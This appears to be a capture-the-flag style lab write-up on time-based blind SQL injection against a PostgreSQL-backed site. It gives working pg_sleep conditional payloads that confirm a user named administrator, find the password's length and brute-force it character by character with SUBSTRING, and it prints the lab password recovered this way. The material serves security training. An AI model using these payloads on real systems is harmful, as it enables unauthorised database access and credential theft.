# Lab: Blind SQL injection with time delays and information retrieval #

## Lab Description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/76beeee9-dd9c-4c5b-affb-36ae2a8c0951)

## Target Website ## 
![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/c36087da-4cac-4ddb-a5c6-afb5c1df13e1)

> When we use the payload `'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--` so what it means
  is that if 1=1 then delay of 10 seconds else delay of 0 seconds we get the result after the 10 seconds 

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/b27d4fb3-df38-4aa9-8360-baf8aeeeba19)

> let change 1=2 which is false it should give output immediately.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/4267b815-518d-4865-a1f6-a058f13b8550)

> We get the output immedialtely

> We have to extract the details from the database `'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
  we are using this payload to check whether user named administrator is there or not

 ![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/2314d06f-9800-40c6-a9c0-c60919524c52)
> We got the output 10 second delay so administrator is there.

> We have to find the password of the administrator first we have to find the length of the password

  ![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/3c497783-a658-479f-a149-736c77aa092a)
  
> It took 10 seconds get response  password length is greater than 1 we send this to intruder to find the length.
![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/f1df51a2-cb8e-47ff-a099-c8417b85aa6b)

> From 20 onwards time delay is less than 10 seconds we can say that password length 20 we have to bruteforce password.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/0e90ceaf-dafa-46d5-a012-202157a06d7a)

> When we try find the first character of the password we got output the less than the 10 seconds using the payload
  `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
> we can bruteforce password

> So by bruteforcing we found that first letter of the password `w` so we can use substring to bruteforce rest


![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/078e443b-fd8e-4acd-80e0-9e868d12dcc4)

we got the passsord `wtrfgutpd474e1d9q521`

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/899a4661-4958-4e5e-96d1-9be4b0f036e1)


